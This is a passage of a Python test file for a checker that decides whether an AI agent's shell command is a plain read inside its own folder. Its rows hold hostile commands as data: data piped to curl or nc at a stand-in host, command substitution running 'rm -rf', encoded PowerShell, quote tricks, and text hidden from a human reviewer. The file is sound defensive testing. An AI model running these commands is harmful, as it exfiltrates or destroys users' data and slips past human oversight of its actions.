"""T0408-K: the wall in front of the permission judge, as a table you can count.

The user, 8 October 2026: "Build it, and let it allow plain reads inside a seat's own
folder". `plain_read.assess` decides, with no model, whether a tool call is such a read.
The design must stay safe with a judge that answers "allow" to everything, so every row
below is a call and the answer the WALL must give on its own.

CASES is one row per call: the command, the shell, the expected reason code ("" means
eligible) and the attack the row stands for. ORDER is the second, smaller table: what
the ONE insertion keeps (the policy owner's invariants 1, 2 and 6). Since T0408-L its
rows go through the real approval door, with the count-only setting off and on.

Every command here is DATA. Nothing in this file runs one: the trees are built under
pytest's temporary directory; `assess` and `tool_policy.evaluate` read them, and the
door (`LiteTUI._authorize_action`) only decides, it never calls the tool behind it.
"""
from __future__ import annotations

import ast
import os
import re
import sys
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path

import pytest

import judge_door as door
from litetui import paths
from litetui import permission_judge as pj
from litetui import plain_read as pr
from litetui import tool_policy as tp
from litetui import worktree_scope as ws

BASH, PS = pr.BASH, pr.POWERSHELL
OK = ""
SEAT = "Seat"
FAULT = "fault"                     # the reader itself failed: nothing was proved
_DRIVE_PATH = re.compile(r"(?<![A-Za-z])[A-Za-z]:[\\/]|@WTB@|@OTHERB@|@WTROOTED")


@dataclass(frozen=True)
class Row:
    id: str
    group: str
    shell: str | None
    command: object                     # the command text; `@WT@` and friends are filled in
    reason: str                         # "" = eligible, else one of plain_read.REASONS
    attack: str                         # what the row stands for
    tool: str = ""                      # default: the shell's own tool
    args: dict | None = None            # whole argument mapping, instead of {"command": ...}
    extra: dict = field(default_factory=dict)
    where: str = "wt"                   # which directory is the seat's workspace
    cwd: str = ""                       # the tool process's directory (default: the workspace)
    seat: object = SEAT
    needs: str = ""                     # symlink | junction | hardlink | windows
    shows: tuple | None = None          # the operands a judge must be shown
    verbs: tuple | None = None


CASES: list[Row] = []


def row(group, shell, command, reason, attack, **kw):
    n = sum(r.group == group for r in CASES) + 1
    CASES.append(Row(f"{group}:{n:03d}", group, shell, command, reason, attack, **kw))


def bash(group, command, reason, attack, **kw):
    row(group, BASH, command, reason, attack, **kw)


def ps(group, command, reason, attack, **kw):
    row(group, PS, command, reason, attack, **kw)


def sized(head: str, tail: str, total: int) -> str:
    return head + "x" * (total - len(head) - len(tail)) + tail


# ── the tool, the shell, the arguments ───────────────────────────────────────

row("tool", None, None, pr.TOOL, "the read tool itself: never asks, so nothing to waive",
    tool="read", args={"path": "@WT@/a.txt"})
row("tool", None, None, pr.TOOL, "the Claude backend's Read tool", tool="Read",
    args={"file_path": "@WT@/a.txt"})
row("tool", None, None, pr.TOOL, "the grep tool itself", tool="grep",
    args={"pattern": "x", "path": "."})
row("tool", None, None, pr.TOOL, "the Claude backend's Grep tool", tool="Grep",
    args={"pattern": "x", "path": "."})
row("tool", None, None, pr.TOOL, "the Claude backend's Glob tool", tool="Glob",
    args={"pattern": "**/*.py"})
row("tool", None, None, pr.TOOL, "the write tool", tool="write",
    args={"path": "a.txt", "content": "x"})
row("tool", BASH, "cat a.txt", pr.TOOL, "an MCP shell: its effects are not declared",
    tool="mcp__litesuite-tools__shell")
row("tool", BASH, "cat a.txt", pr.TOOL, "a tool NAMED read that carries a command", tool="read")
row("tool", BASH, "cat a.txt", pr.TOOL, "no tool name", tool=" ")
row("tool", BASH, "cat a.txt", OK, "the Claude backend's native Bash is the bash door",
    tool="Bash", shows=("a.txt",), verbs=("cat",))
row("tool", PS, "Get-Content a.txt", OK, "tool names are case-blind", tool="PowerShell")
row("shell", None, "cat a.txt", pr.SHELL, "shell kind unknown: no grammar to prove it under",
    tool="bash")
row("shell", PS, "cat a.txt", pr.SHELL, "bash tool judged under PowerShell's grammar",
    tool="bash")
row("shell", BASH, "Get-Content a.txt", pr.SHELL, "powershell tool judged under bash's grammar",
    tool="powershell")
row("shell", "cmd", "type a.txt", pr.SHELL, "cmd.exe: a grammar this reader does not hold",
    tool="bash")
row("arguments", BASH, ["cat", "a.txt"], pr.ARGUMENTS, "an argv list is not shell text")
row("arguments", BASH, None, pr.ARGUMENTS, "no command at all", args={"timeout": 5})
row("arguments", BASH, b"cat a.txt", pr.ARGUMENTS, "bytes are not text")
row("arguments", BASH, "cat a.txt", pr.ARGUMENTS, "a cwd argument moves where it runs",
    extra={"cwd": "@MAIN@"})
row("arguments", PS, "Get-Content a.txt", pr.ARGUMENTS, "an env argument", extra={"env": {}})
row("arguments", BASH, "cat a.txt", OK, "the tool's own arguments are known",
    extra={"timeout": 30, "background": False, "description": "read a file"})

# ── empty, whitespace, the 2,000-character edge ──────────────────────────────

for blank in ("", " ", "\t\n ", "\n", ";", ";;"):
    bash("empty", blank, pr.EMPTY, "nothing to run")
for blank in ("", "   ", "\r\n", ";"):
    ps("empty", blank, pr.EMPTY, "nothing to run")
bash("too-long", sized("grep -n '", "' a.txt", 2000), OK, "exactly 2,000 characters")
bash("too-long", sized("grep -n '", "' a.txt", 2001), pr.TOO_LONG, "2,001 characters")
bash("too-long", "cat a.txt" + " " * 4000, pr.TOO_LONG, "padding past what a human is shown")
bash("too-long", sized("cat a.txt #", "\nrm -rf x", 2100), pr.TOO_LONG,
     "a second command beyond the shown part")
ps("too-long", sized("Select-String -Pattern '", "' a.txt", 2000), OK, "exactly 2,000 characters")
ps("too-long", sized("Select-String -Pattern '", "' a.txt", 2001), pr.TOO_LONG,
   "2,001 characters")
ps("too-long", "Get-Content a.txt" + " " * 4000, pr.TOO_LONG, "padding past what a human is shown")

# ── characters ───────────────────────────────────────────────────────────────

bash("charset", "cat a.txt\u00a0b.txt", pr.CHARSET, "a no-break space is not a separator here")
bash("charset", "cat a.txt\x00", pr.CHARSET, "a NUL")
bash("charset", "cat a.txt\x1b[2K", pr.CHARSET, "a terminal escape hiding text from a reader")
bash("charset", "cat a.txt\r\nls", pr.CHARSET, "bash keeps the CR as part of the file name")
bash("charset", "cat r\u00e9sum\u00e9.txt", pr.CHARSET, "a non-ASCII name: not proved, not eligible")
bash("charset", "cat a.txt\x7f", pr.CHARSET, "DEL")
ps("charset", "Get-Content 'a.txt\u2019; Remove-Item b.txt; \u2018'", pr.CHARSET,
   "PowerShell reads a typographic quote as a quote: the middle RUNS")
ps("charset", "Get-Content a.txt \u2013Stream x", pr.CHARSET,
   "PowerShell reads an en dash as a parameter dash")
ps("charset", "Get-Content a.txt\x0c", pr.CHARSET, "a form feed")
ps("charset", "Get-Content a.txt\r\nGet-ChildItem", OK, "CRLF is PowerShell's own newline")

# ── every verb on the list, in a form that is eligible ───────────────────────

for command, shows in (
        ("cat a.txt", ("a.txt",)), ("cat -n a.txt b.txt", ("a.txt", "b.txt")),
        ("cat -- a.txt", ("a.txt",)), ("head -n 5 a.txt", None), ("head -5 a.txt", None),
        ("head --lines=5 a.txt", None), ("tail -n 20 a.txt", None), ("tail -n +2 a.txt", None),
        ("ls", (".",)), ("ls -la", (".",)), ("ls -la src", ("src",)),
        ("ls --color=never src sub/deep", ("src", "sub/deep")), ("wc -l a.txt", None),
        ("grep -n foo a.txt", ("a.txt",)), ("grep -in -A 2 foo a.txt src/x.py", None),
        ("grep -e foo -e bar a.txt", ("a.txt",)), ("grep --color=never -c foo a.txt", None),
        ("egrep 'a|b' a.txt", None), ("fgrep foo a.txt", None),
        ("rg --no-config -n -C 2 foo src/x.py", ("src/x.py",)), ("stat a.txt", None),
        ("stat -c '%s %n' a.txt", None), ("stat missing.txt", ("missing.txt",)),
        ("file a.txt", None), ("file -b --mime-type a.txt", None), ("sha256sum a.txt", None),
        ("cmp a.txt b.txt", ("a.txt", "b.txt")), ("diff -u a.txt b.txt", None),
        ('cat "my docs/f.txt"', ("my docs/f.txt",)), ("cat @WT@/a.txt", ("a.txt",)),
        ("cat ./a.txt", ("a.txt",)),
        ("cat .gitignore", (".gitignore",)), ("ls .github", (".github",))):
    bash("verb-ok", command, OK, "a plain read, as written by a seat", shows=shows)
for command, verbs in (
        ("cat a.txt 2>&1", ("cat",)), ("ls -la 2>&1", ("ls",)),
        ("cat a.txt 2>&1 | grep foo", ("cat", "grep")), ("cat a.txt | head -3", ("cat", "head")),
        ("cat a.txt && ls", ("cat", "ls")), ("cat a.txt || ls", ("cat", "ls")),
        ("cat a.txt; ls", ("cat", "ls")), ("cat a.txt\nls -la", ("cat", "ls")),
        ("ls | wc -l", ("ls", "wc")), ("grep -c foo a.txt | cat", ("grep", "cat")),
        ("ls | cat a.txt", ("ls", "cat")), ("cat a.txt ;", ("cat",))):
    bash("join-ok", command, OK, "plain reads joined by | && || ; newline, with 2>&1",
         verbs=verbs)
for command, shows in (
        ("Get-Content a.txt", ("a.txt",)), ("GET-CONTENT a.txt", ("a.txt",)),
        ("Get-Content -Path a.txt -Raw", None),
        ("Get-Content -LiteralPath 'my docs/f.txt' -TotalCount 5", ("my docs/f.txt",)),
        ("gc a.txt -Tail 3", None),
        ("Get-Content a.txt -Encoding UTF8 -ErrorAction SilentlyContinue", None),
        ("Get-ChildItem", (".",)), ("Get-ChildItem src -Force", ("src",)),
        ("gci -Name", (".",)), ("Get-Item a.txt", None),
        ("gi src", None), ("Test-Path a.txt", None),
        ("Test-Path missing.txt -PathType Leaf", ("missing.txt",)), ("Get-FileHash a.txt", None),
        ("Get-FileHash a.txt -Algorithm SHA256", None),
        ("Select-String -Pattern foo -Path a.txt", ("a.txt",)), ("Select-String foo a.txt", None),
        ("sls -SimpleMatch foo a.txt", None),
        ("Get-Content @WTB@\\a.txt", ("a.txt",)), ("Get-Content .\\src\\x.py", ("src/x.py",)),
        ("Get-Content a.txt 2>&1", None)):
    ps("verb-ok", command, OK, "a plain read, as written by a seat", shows=shows)
for command, verbs in (
        ("Get-Content a.txt | Select-String foo", ("get-content", "select-string")),
        ("Get-ChildItem | Select-Object Name,Length", ("get-childitem", "select-object")),
        ("Get-ChildItem | Select-Object -First 5", None),
        ("Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 3",
         ("get-childitem", "sort-object", "select-object")),
        ("gci | select Name", ("get-childitem", "select-object")),
        ("Get-Content a.txt | Measure-Object -Line", ("get-content", "measure-object")),
        ("gc a.txt | measure -Line -Word", None),
        ("Get-Content data.json | ConvertFrom-Json | ConvertTo-Json -Depth 4",
         ("get-content", "convertfrom-json", "convertto-json")),
        ("Get-Content data.json -Raw | ConvertFrom-Json | ConvertTo-Json -Depth 4 -Compress", None),
        ("Get-ChildItem | Sort-Object LastWriteTime | Select-Object name,length,Extension",
         ("get-childitem", "sort-object", "select-object")),
        ("Get-ChildItem | Measure-Object -Property Length -Sum", None),
        ("Get-Content a.txt | Measure-Object Count", None),
        ("Get-ChildItem; Get-Content a.txt", ("get-childitem", "get-content")),
        ("Get-Content a.txt || Get-ChildItem", ("get-content", "get-childitem"))):
    ps("join-ok", command, OK, "plain reads joined by | ; ||, with object filters",
       verbs=verbs)

# ── every verb, each flag that writes, runs, recurses or follows ─────────────

for command, attack in (
        ("tail -f a.txt", "tail -f never ends"), ("tail -F a.txt", "tail -F"),
        ("tail --follow a.txt", "tail --follow"), ("tail --follow=name a.txt", "tail --follow=name"),
        ("tail --retry a.txt", "tail --retry"), ("tail --pid=1 a.txt", "tail --pid"),
        ("tail -s 1 a.txt", "tail -s"), ("head -n5 a.txt", "an attached value this reader does not split"),
        ("head -n x a.txt", "a count that is not a number"),
        ("ls -R", "ls -R: recursion crosses links nobody resolved"),
        ("ls --recursive src", "ls --recursive"), ("ls -lR src", "ls -lR"),
        ("ls -L src", "ls -L follows links"), ("ls --dereference src", "ls --dereference"),
        ("ls -H src", "ls -H follows links"), ("ls -I x src", "ls -I takes a pattern"),
        ("ls --hide=x src", "ls --hide"), ("ls -Z src", "ls -Z"),
        ("wc --files0-from=a.txt", "wc reads a LIST of files from a file"),
        ("grep -r foo src", "grep -r"), ("grep -R foo src", "grep -R follows links"),
        ("grep --recursive foo src", "grep --recursive"), ("grep -rn foo src", "grep -rn"),
        ("grep -f b.txt a.txt", "grep -f reads a second file"),
        ("grep --file=b.txt a.txt", "grep --file"), ("grep -d recurse foo src", "grep -d recurse"),
        ("grep --directories=recurse foo src", "grep --directories"),
        ("grep -D read foo a.txt", "grep -D read: devices"),
        ("grep --include=x foo a.txt", "grep --include"), ("grep --exclude-dir=x foo a.txt", "grep --exclude-dir"),
        ("grep -z foo a.txt", "grep -z"), ("grep -A2 foo a.txt", "an attached value"),
        ("egrep -r foo src", "egrep -r"), ("fgrep -r foo src", "fgrep -r"),
        ("rg --no-config --pre cat foo a.txt", "rg --pre RUNS a program on every file"),
        ("rg --no-config --pre=cat foo a.txt", "rg --pre="), ("rg --no-config --pre-glob x foo a.txt", "rg --pre-glob"),
        ("rg --no-config -z foo a.txt", "rg -z runs a decompressor"), ("rg --no-config --search-zip foo a.txt", "rg --search-zip"),
        ("rg --no-config --hostname-bin x foo a.txt", "rg --hostname-bin runs a program"),
        ("rg --no-config -f b.txt a.txt", "rg -f reads a second file"), ("rg --no-config --file=b.txt a.txt", "rg --file"),
        ("rg --no-config --files", "rg --files lists the tree"), ("rg --no-config -L foo a.txt", "rg -L follows links"),
        ("rg --no-config --follow foo a.txt", "rg --follow"), ("rg --no-config -u foo a.txt", "rg -u"),
        ("rg --no-config -uu foo a.txt", "rg -uu"), ("rg --no-config --unrestricted foo a.txt", "rg --unrestricted"),
        ("rg --no-config --hidden foo a.txt", "rg --hidden"), ("rg --no-config --no-ignore foo a.txt", "rg --no-ignore"),
        ("rg --no-config -g x foo a.txt", "rg -g"), ("rg --no-config --glob=x foo a.txt", "rg --glob"),
        ("rg --no-config --ignore-file b.txt foo a.txt", "rg --ignore-file"),
        ("rg --no-config --type-add x foo a.txt", "rg --type-add"), ("rg --no-config -r x foo a.txt", "rg -r"),
        ("rg --no-config --replace=x foo a.txt", "rg --replace"), ("rg --no-config --debug foo a.txt", "rg --debug"),
        ("stat -L a.txt", "stat -L follows links"), ("stat --dereference a.txt", "stat --dereference"),
        ("stat -f a.txt", "stat -f"), ("stat --printf=x a.txt", "stat --printf"),
        ("file -C a.txt", "file -C WRITES a compiled magic file"),
        ("file --compile a.txt", "file --compile"), ("file -m b.txt a.txt", "file -m reads a magic file"),
        ("file --magic-file=b.txt a.txt", "file --magic-file"),
        ("file -f b.txt", "file -f reads a LIST of files"), ("file --files-from=b.txt", "file --files-from"),
        ("file -L a.txt", "file -L follows links"), ("file -z a.txt", "file -z"),
        ("file -s a.txt", "file -s reads devices"),
        ("sha256sum -c a.txt", "sha256sum -c reads the files a list names"),
        ("sha256sum --check a.txt", "sha256sum --check"),
        ("sha256sum --ignore-missing a.txt", "sha256sum --ignore-missing"),
        ("cmp -i 5 a.txt b.txt", "cmp -i"), ("diff -r src sub", "diff -r"),
        ("diff --recursive src sub", "diff --recursive"),
        ("diff --from-file=a.txt b.txt", "diff --from-file"),
        ("diff --to-file=a.txt b.txt", "diff --to-file"), ("diff -x pat a.txt b.txt", "diff -x"),
        ("diff -X b.txt a.txt b.txt", "diff -X reads a third file"),
        ("diff --line-format=x a.txt b.txt", "diff --line-format"),
        ("diff -D NAME a.txt b.txt", "diff -D"), ("diff --label x a.txt b.txt", "diff --label"),
        ("cat --help", "an option nobody listed"),
        ("cat a.txt -n", "an option after a file: a POSIX-order parser reads -n as a FILE"),
        ("head a.txt -n 3", "an option after a file"), ("ls src -la", "an option after a file"),
        ("grep foo -n a.txt", "an option after the pattern"),
        ("grep foo a.txt -e ../../outside.txt",
         "after a file, a POSIX-order parser reads -e's value as a FILE outside the folder")):
    bash("flags", command, pr.OPTION, attack)
for command, reason, attack in (
        ("cat", pr.OPERAND, "cat with no file waits on standard input"),
        ("cat -", pr.OPERAND, "standard input by name"),
        ("grep foo", pr.OPERAND, "grep with no file"), ("grep", pr.OPERAND, "grep with no pattern"),
        ("cat a.txt | grep", pr.OPERAND, "a search with no pattern is not a form this reader proves"),
        ("cat a.txt | rg -n", pr.OPERAND, "a search with no pattern is not a form this reader proves"),
        ("grep foo src", pr.NOT_PLAIN_FILE, "a directory given to a content verb"),
        ("grep foo .", pr.NOT_PLAIN_FILE, "the whole folder given to a content verb"),
        ("rg --no-config foo", pr.OPERAND, "rg with no path searches the whole tree"),
        ("rg --no-config foo src", pr.NOT_PLAIN_FILE, "rg on a directory recurses"),
        ("rg --no-config foo .", pr.NOT_PLAIN_FILE, "rg on the folder recurses"),
        ("cmp a.txt", pr.OPERAND, "cmp needs exactly two files"),
        ("cmp a.txt b.txt notes.md", pr.OPERAND, "cmp's third word is not a file"),
        ("cmp a.txt -", pr.OPERAND, "cmp against standard input"),
        ("diff a.txt", pr.OPERAND, "diff needs exactly two files"),
        ("diff src sub", pr.NOT_PLAIN_FILE, "diff of two directories"),
        ("wc -l sub", pr.NOT_PLAIN_FILE, "wc on a directory"),
        ("cat a.txt | cmp b.txt", pr.OPERAND, "cmp does not read its input")):
    bash("flags", command, reason, attack)
for command, attack in (
        ("Get-Content a.txt -Stream x", "Get-Content -Stream reads another data stream"),
        ("Get-Content a.txt -Wait", "Get-Content -Wait never ends"),
        ("Get-Content a.txt -Str x", "a parameter PREFIX: -Str binds -Stream"),
        ("Get-Content a.txt -Wa", "a parameter PREFIX: -Wa binds -Wait"),
        ("Get-Content a.txt -Filter x", "Get-Content -Filter"),
        ("Get-Content a.txt -Include x", "Get-Content -Include"),
        ("Get-Content a.txt -Exclude x", "Get-Content -Exclude"),
        ("Get-Content a.txt -Credential x", "Get-Content -Credential"),
        ("Get-Content a.txt -ReadCount 0", "Get-Content -ReadCount"),
        ("Get-Content a.txt -Delimiter x", "Get-Content -Delimiter"),
        ("Get-Content a.txt -OutVariable v", "-OutVariable writes a variable"),
        ("Get-Content a.txt -ov v", "-ov"),
        ("Get-Content a.txt -PipelineVariable p", "-PipelineVariable"),
        ("Get-Content a.txt -ErrorVariable e", "-ErrorVariable"),
        ("Get-Content -Path:a.txt", "a colon-bound value this reader does not split"),
        ("Get-Content a.txt -Encoding Byte", "an encoding nobody listed"),
        ("Get-Content a.txt -AsByteStream", "Get-Content -AsByteStream"),
        ("Get-Content a.txt -Force", "Get-Content -Force"),
        ("Get-Content -Path", "a parameter with no value"),
        ("Get-Content -Path -Raw", "a parameter given as a value"),
        ("Get-ChildItem -Recurse", "Get-ChildItem -Recurse crosses junctions"),
        ("Get-ChildItem src -Depth 3", "Get-ChildItem -Depth recurses"),
        ("Get-ChildItem -Filter x", "Get-ChildItem -Filter"),
        ("Get-ChildItem -Include x", "Get-ChildItem -Include"),
        ("Get-ChildItem -Exclude x", "Get-ChildItem -Exclude"),
        ("Get-ChildItem -FollowSymlink", "Get-ChildItem -FollowSymlink"),
        ("Get-ChildItem -Attributes Hidden", "Get-ChildItem -Attributes"),
        ("Get-ChildItem -r", "a parameter PREFIX: -r binds -Recurse"),
        ("Get-ChildItem -s", "the alias -s binds -Recurse"),
        ("Get-Item a.txt -Stream x", "Get-Item -Stream lists data streams"),
        ("Test-Path a.txt -IsValid", "Test-Path -IsValid"),
        ("Test-Path a.txt -OlderThan x", "Test-Path -OlderThan"),
        ("Get-FileHash -InputStream x", "Get-FileHash -InputStream"),
        ("Select-String foo a.txt -Include x", "Select-String -Include"),
        ("Select-String foo a.txt -Exclude x", "Select-String -Exclude"),
        ("Select-String foo -InputObject x", "Select-String -InputObject"),
        ("Select-String foo a.txt -Culture x", "Select-String -Culture"),
        ("Select-String foo a.txt -Context 2,3", "a pair where a number is listed"),
        ("Get-ChildItem | Select-Object -ExcludeProperty Name", "Select-Object -ExcludeProperty"),
        ("Get-ChildItem | Select-Object -Wait", "Select-Object -Wait"),
        ("Get-ChildItem | Select-Object -SkipLast 1", "Select-Object -SkipLast"),
        ("Get-ChildItem | Select-Object -Index 0", "Select-Object -Index"),
        ("Get-ChildItem | Select-Object 'Name,Length'", "a quoted list is one odd name"),
        ("Get-ChildItem | Sort-Object -Culture x", "Sort-Object -Culture"),
        ("Get-ChildItem | Sort-Object -Top 3", "Sort-Object -Top"),
        ("Get-Content a.txt | Measure-Object -AllStats", "Measure-Object -AllStats"),
        ("Get-Content a.txt | ConvertTo-Json -InputObject x", "ConvertTo-Json -InputObject"),
        ("Get-Content a.txt | ConvertTo-Json -AsArray", "ConvertTo-Json -AsArray"),
        ("Get-Content a.txt | ConvertFrom-Json -AsHashtable", "ConvertFrom-Json -AsHashtable"),
        ("Get-Content a.txt | ConvertFrom-Json -InputObject x", "ConvertFrom-Json -InputObject"),
        ("Get-Content a.txt | ConvertTo-Json -Depth 5", "a depth past 4 walks out of the object"),
        ("Get-ChildItem | ConvertTo-Json -Depth 99",
         "W5: a deep dump of a file object prints the drive table and the home path"),
        ("Get-Item a.txt | Select-Object -ExpandProperty Directory",
         "W5: expanding a property steps from the file to its parent folders"),
        ("Get-Content data.json | ConvertFrom-Json | Select-Object -ExpandProperty tasks",
         "-ExpandProperty is off the list whatever it expands")):
    ps("flags", command, pr.OPTION, attack)
for command, reason, attack in (
        ("Get-Content", pr.OPERAND, "Get-Content with no path"),
        ("Get-Content a.txt b.txt", pr.OPERAND, "a second bare word binds nothing"),
        ("Get-Content a.txt,b.txt", pr.PATH_FORM, "a comma makes TWO paths; this reader saw one"),
        ("Get-Content a.txt,..\\..\\outside.txt", pr.PATH_FORM,
         "the comma hides a path that leaves the folder"),
        ("Get-Content '-Stream'", pr.SYNTAX, "a quoted dash word is a value"),
        ("Get-ChildItem src x", pr.OPERAND, "the second bare word is -Filter"),
        ("Select-String foo", pr.OPERAND, "Select-String with no file"),
        ("Select-String -Path a.txt", pr.OPERAND, "Select-String with no pattern"),
        ("Select-String -Pattern 'a','b' a.txt", pr.SYNTAX, "an array of patterns"),
        ("Get-ChildItem | Select-Object { Remove-Item x }", pr.SYNTAX,
         "a script block as a property RUNS per object"),
        ("Get-ChildItem | Select-Object -Property @{n='x';e={Remove-Item y}}", pr.SYNTAX,
         "a calculated property runs code"),
        ("Get-ChildItem | Sort-Object { $_.Length }", pr.SYNTAX, "a script block as a sort key"),
        ("Get-Content src", pr.NOT_PLAIN_FILE, "a directory given to a content verb"),
        ("Get-Content missing.txt", pr.NOT_PLAIN_FILE, "a file that is not there to be proved")):
    ps("flags", command, reason, attack)

# ── named attack: redirects ──────────────────────────────────────────────────

for command in ("cat a.txt > out.txt", "cat a.txt >> out.txt", "cat a.txt 2> err.txt",
                "cat a.txt 2>/dev/null", "cat a.txt &> out.txt", "cat < a.txt", "cat <<< x",
                "cat <<EOF\nx\nEOF", "cat a.txt 1>&2", "cat a.txt >&2", "cat a.txt 2>&1>out.txt",
                "cat a.txt 12>&1", "cat a.txt >| b.txt", "cat a.txt 2>&1 > out.txt",
                "grep 'a' 'a.txt' > out.txt", "cat a.txt>b.txt", "cat <(ls)"):
    bash("redirect", command, pr.REDIRECT, "a redirect that is not the word 2>&1")
for command in ("Get-Content a.txt > out.txt", "Get-Content a.txt >> out.txt",
                "Get-Content a.txt 2> err.txt", "Get-Content a.txt 3>&1",
                "Get-Content a.txt 2>&1 > out.txt", "Get-Content < a.txt",
                "Get-Content a.txt 1> out.txt", "Get-Content a.txt>b.txt"):
    ps("redirect", command, pr.REDIRECT, "a redirect that is not the word 2>&1")
ps("redirect", "Get-Content a.txt *> all.txt", pr.GLOB, "the all-streams redirect")

# ── named attack: a pipe stage that writes or runs ───────────────────────────

for tail in ("tee out.txt", "sh", "bash", "xargs rm", "dd of=x", "sort -o a.txt", "sponge a.txt",
             "python", "sed -i s/a/b/ b.txt", "less", "more", "uniq a.txt b.txt", "xxd -r",
             "awk 1", "sed -n 1p", "tr a b", "cut -c1", "nc host 80"):
    bash("pipe-write", f"cat a.txt | {tail}", pr.VERB, f"a stage that is not on the list: {tail}")
bash("pipe-write", "cat a.txt | awk '{print > \"x\"}'", pr.VERB, "awk writing a file")
for tail in ("Out-File out.txt", "Set-Content out.txt", "Add-Content out.txt", "Tee-Object x",
             "Export-Csv x", "Out-GridView", "iex", "Invoke-Expression", "Where-Object Name",
             "Remove-Item", "Set-Clipboard", "clip", "Out-String", "Format-Table", "Out-Null",
             "Out-Host", "Write-Output"):
    ps("pipe-write", f"Get-Content a.txt | {tail}", pr.VERB,
       f"a stage that is not on the list: {tail}")
ps("pipe-write", "Get-Content a.txt | ForEach-Object { Remove-Item $_ }", pr.SYNTAX,
   "a script block per line")
ps("pipe-write", "Get-Content a.txt | % { $_ }", pr.SUBSTITUTION, "% is ForEach-Object")
ps("pipe-write", "Get-Content a.txt | Sort-Object -Unique | Set-Content a.txt", pr.VERB,
   "a filter chain ending in a writer")

# ── named attack: wrapped, encoded and launched ──────────────────────────────

for command in ("bash -c 'cat a.txt'", 'sh -c "cat a.txt"', "eval cat a.txt", "exec cat a.txt",
                "env cat a.txt", "xargs cat", "nohup cat a.txt", "time cat a.txt",
                "timeout 5 cat a.txt", "command cat a.txt", "builtin cat a.txt", "sudo cat a.txt",
                "source a.txt", ". a.txt", "./a.txt", 'python -c "print(1)"', "node -e 1",
                "start a.txt", "cmd /c type a.txt", "powershell -Command Get-Content a.txt",
                "pwsh -EncodedCommand AAAA", "FOO=1 cat a.txt", "LESSOPEN=x cat a.txt",
                "/bin/cat a.txt", "'cat' a.txt", '"cat" a.txt', "cat.exe a.txt", "CAT a.txt",
                "cd src && cat x.py", "pushd src", "if true; then cat a.txt; fi",
                "for f in a.txt; do cat a.txt; done", "! cat a.txt", "echo hi", "true", "type cat",
                "dir", "findstr foo a.txt", "sort a.txt", "find . -name x", "tree"):
    bash("launcher", command, pr.VERB, "a launcher, a wrapper or a verb nobody listed")
for command in ("cat a.txt &", "cat a.txt & ls", "\\cat a.txt", "cat a.txt |& grep x"):
    bash("launcher", command, pr.SYNTAX, "a background job or an escaped verb")
bash("launcher", "f() { cat a.txt; }; f", pr.SUBSTITUTION, "a function definition")
for command in ('powershell -Command "Get-Content a.txt"', "pwsh -c Get-ChildItem",
                "powershell -EncodedCommand AAAA", "powershell -enc AAAA", "cmd /c type a.txt",
                ". .\\script.ps1", ".\\script.ps1", "iex 'Get-Content a.txt'",
                'Invoke-Expression "Get-Content a.txt"', "Start-Process notepad a.txt",
                "start a.txt", "saps notepad", "Invoke-Item a.txt", "ii a.txt",
                "bash -c 'cat a.txt'", "'Get-Content' a.txt",
                "Microsoft.PowerShell.Management\\Get-Content a.txt",
                "Set-Location src; Get-Content x.py", "cd src; gc x.py", "Write-Output hi",
                "echo hi", "Get-Process", "Get-Command git", "findstr foo a.txt", "more a.txt",
                "Get-Clipboard", "Resolve-Path a.txt", "Get-Acl a.txt", "Get-Date"):
    ps("launcher", command, pr.VERB, "a launcher, a wrapper or a verb nobody listed")
for command in ("& Get-Content a.txt", "& 'Get-Content' a.txt", "Get-Content a.txt &",
                "Invoke-Command { Get-Content a.txt }", "& { Get-Content a.txt }"):
    ps("launcher", command, pr.SYNTAX, "the call operator, a job or a script block")
for command in ("cat a.txt", "type a.txt", "ls src", "dir", "Get-ChildItem | sort Name",
                "Get-Content a.txt | sort id_rsa"):
    ps("launcher", command, pr.VERB,
       "an alias on Windows, the GNU program under PowerShell for Unix: `sort X` reads a FILE")
ps("launcher", "[IO.File]::ReadAllText('a.txt')", pr.GLOB, "a .NET call")
ps("launcher", "$x = Get-Content a.txt", pr.SUBSTITUTION, "an assignment")

# ── named attack: substitution and expansion ─────────────────────────────────

for command in ("cat $(echo a.txt)", "cat `echo a.txt`", "cat $FILE", "cat ${FILE}",
                'cat "$HOME/x"', 'cat "a`id`"', "(cat a.txt)", "cat a.txt $((1+1))",
                "cat %USERPROFILE%/x", "cat $'a.txt'", 'grep "$(rm -rf x)" a.txt'):
    bash("substitution", command, pr.SUBSTITUTION, "the shell computes what is read")
for command, reason in (("cat {a,b}.txt", pr.SYNTAX), ("cat a.tx?", pr.GLOB),
                        ("cat *.txt", pr.GLOB), ("cat [ab].txt", pr.GLOB),
                        ("ls *", pr.GLOB), ("cat a.txt # note", pr.SYNTAX),
                        ("cat a.txt \\\n b.txt", pr.SYNTAX), ("cat a\\ b.txt", pr.SYNTAX),
                        ('grep "a\\"; rm x; \\"" a.txt', pr.SYNTAX),
                        ('grep "a\\\\b" a.txt', pr.SYNTAX),
                        ("grep 'unterminated a.txt", pr.SYNTAX), ("cat 'a*.txt'", pr.GLOB)):
    bash("substitution", command, reason, "expansion: the words run are not the words written")
for command in ("Get-Content $path", 'Get-Content "$env:USERPROFILE/x"',
                "Get-Content (Join-Path . a.txt)", "Get-Content $(1)", "Get-Content a`.txt",
                "Get-Content ${x}", 'Get-Content "a$(1)"', "gc --% a.txt",
                'Select-String "x$(Remove-Item y)" a.txt', "Get-Content a.txt | % Name"):
    ps("substitution", command, pr.SUBSTITUTION, "PowerShell computes what is read")
for command, reason in (("Get-Content @('a.txt')", pr.SYNTAX), ("gc *.txt", pr.GLOB),
                        ("gc 'a*.txt'", pr.GLOB), ("gc 'a[bc].txt'", pr.GLOB),
                        ("gc a.txt # c", pr.SYNTAX), ("Get-Content 'a'.txt", pr.SYNTAX),
                        ("Get-Content a'.txt'", pr.SYNTAX), ("Get-Content 'it''s.txt'", pr.SYNTAX),
                        ("Get-Content 'a'..\\..\\outside.txt", pr.SYNTAX),
                        ("Get-Content @args", pr.SYNTAX), ("Get-Content {a.txt}", pr.SYNTAX),
                        ("if(Test-Path a.txt){Get-Content a.txt}", pr.SUBSTITUTION)):
    ps("substitution", command, reason, "expansion: the words run are not the words written")

# ── named attack: the network ────────────────────────────────────────────────

for command, reason in (
        ("curl https://example.com", pr.URL), ("curl example.com", pr.VERB),
        ("wget example.com", pr.VERB), ("nc host 80", pr.VERB), ("ssh host cat x", pr.VERB),
        ("scp a.txt host:x", pr.VERB), ("grep 'http://x' a.txt", pr.URL),
        ("cat ftp://x", pr.URL), ("cat a.txt | curl -d @- example.com", pr.VERB),
